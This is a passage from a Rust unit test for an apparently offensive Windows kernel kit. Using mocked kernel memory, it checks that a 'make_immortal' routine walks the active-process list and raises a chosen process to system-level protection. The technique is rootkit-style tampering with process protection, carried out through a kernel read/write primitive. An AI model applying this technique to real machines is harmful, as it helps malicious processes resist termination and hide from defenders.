        krw.set_u64(l1 + 8, head as u64);
        krw.set_u64(l2, head as u64);
        krw.set_u64(l2 + 8, l1 as u64);
        krw.set_u64(e1 + offsets.unique_process_id, 100);
        krw.set_u64(e2 + offsets.unique_process_id, 200);

        let kit = PplStripper {
            ps_active_process_head_kva: head,
            offsets,
        };
        // PID 100 → success (writes to e1).
        kit.make_immortal(&krw, 100).unwrap();
        let expected_protection = ps_protection::TYPE_PROTECTED
            | (ps_protection::SIGNER_WIN_SYSTEM << ps_protection::SIGNER_SHIFT);
        assert_eq!(krw.get_byte(e1 + offsets.protection), expected_protection);
        // PID 999 → NotFound (not in list).
        assert!(matches!(
            kit.make_immortal(&krw, 999),
            Err(KitError::NotFound)
        ));
        // e2's protection was NOT modified by the PID 100 call.
        assert_eq!(krw.get_byte(e2 + offsets.protection), 0x00);
    }
}
